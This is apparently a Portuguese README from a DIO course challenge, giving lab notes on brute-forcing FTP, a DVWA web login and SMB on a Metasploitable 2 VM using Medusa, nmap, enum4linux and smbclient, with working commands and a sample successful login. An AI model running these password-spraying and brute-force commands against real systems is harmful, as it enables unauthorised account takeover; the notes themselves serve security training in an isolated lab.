# projeto_BruteForce_Medusa_e_KaliLinux
Desafio DIO - Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux<br>

<b>PASSWORD SPRAYING</b><br>
<b>TESTA SENHA COMUM PARA VÁRIOS USUÁRIOS DIFERENTES<br>
tipo “empresa123” -  “empresa2025” e etc.<br>
como vai realizar a tentativa uma vez para cada usuário, normalmente o sistema não detecta<br>
<b>CREDENTIAL STUFFING</b><br>
Usando credenciais vazadas (listas de credenciais)<br><br>
<b>USANDO KALI LINUX E MEDUSA</b><br>
Hidra no kali</b><br>
Usa listas de pssowrd list e tenta em vários tipos de protocolos, ssh, ftp e etc.<br>
<b>Ncrack</b><br>
<b>John (the reapper)</b> craqueador offline - Quebra de hash de senhas.<br>
<b>Wpscan</b> – identifica plugins e user do worpress e faz ataque de wordlist<br>
<b>PATATOR</b> – usuários experientes – consegue-se configurar diversos parâmetros do ataque.<br> 
<b>MEDUSA</b> – foco em ataques de rede (usa parâmetros personalizados em cada protocolo)<br>
muito utilizada quando se tem muitos usuários com senhas em paralelo. Múltiplas tags
auditoria e relatórios de testes. Não muito adaptadas para ataques web. E sim para redes.<br>
<b>PREPARAR O LABORATÓRIO COM KALI E METASPLOITABLE</b> - criando VMs com o Oracle VirtualBox<br>
com as imagens do Kali Linux e Metaspoitable 2<br><br>

<b>ALCANÇAR A MÁQUINA VULNERÁVEL NO METASPLOITABLE</b>

<b>Enumeração</b>
nmap -sV -p 21,22,80,445,139 [ip da máquina]
<b>Testando o FTP da máquina encontrada</b>
ftp 192.168.56.102 [vai pedir usuário e senha]
se não souber... user o medusa para ataque de força bruta. Com lista de usuários e senhas.
Com o comando:
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
[medusa] [host -h] [ip192.168.56.102] [users-U] [lista users.txt] [password-P] [lista pass.txt] [protocolo -M] [protocolo ftp] [quantas treads -t] [números de treads simultâneas 6]
Após encontrar o user e pass, é só digitar ftp e o ip e em seguida colocar o user e pass encontrados.

<b>Aí ele conecta o ftp></b>
ftp 192.168.56.102
Connected to 192.168.56.102
220 (vsFTPd 2.3.4)
Name 192.168.56.102:msfadmin
331 Please specify the password.
Password: msfadmin
230 Login sucessful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

Usando brute force com o medusa em formulários de login [http]

COMANDO
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE:’/dvwa/login.php’ \
-m FORM: ’username=^USER^&password=^PASS^&Login=Login’ \
-m ‘FAIL=Login failed’ -t 6

Para ver no medusa quais são os parâmetros aceitos no http, por exemplo usa-se o comando:
medusa -M http -q


utilizando o enum4linux para ataque via SMB (compartilha arquivos entre Windows e linux)

enum4linux -a 192.168.56.102 | tee enum4_output.txt
[parâmetro -a informa para tentar todas as técnicas de enumeração possíveis]
[Depois da barrinha em pe o comando tee mostra na tela e salva em arquivo .txt]

 Testanto como medusa
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50

agora testando o que se encontrou
smbclient -L //192.168.56.102 -U msfadmin
Password for [WORKGROUP\msfadmin]: você digita a senha encontrada msfadmin e ele mostra os compartilhamentos
tipo:
Sharename	Type	Comment
print$		disk	Pinter drivers
tmp		disk	oh noes”
opt		disk
IPC$		IPC	IPC Service (metasploitable server (Samba 3.0.20-Debian)) 
ADMIN$	IPC	IPC Service (metasploitable server (Samba 3.0.20-Debian))
Msfadmin	disk	Home Directories
Reconnecting with SMB1 for workgroup listing.

Server      	Comment

Workgroup	Master
WORKGROUP	METASPLOITABLE
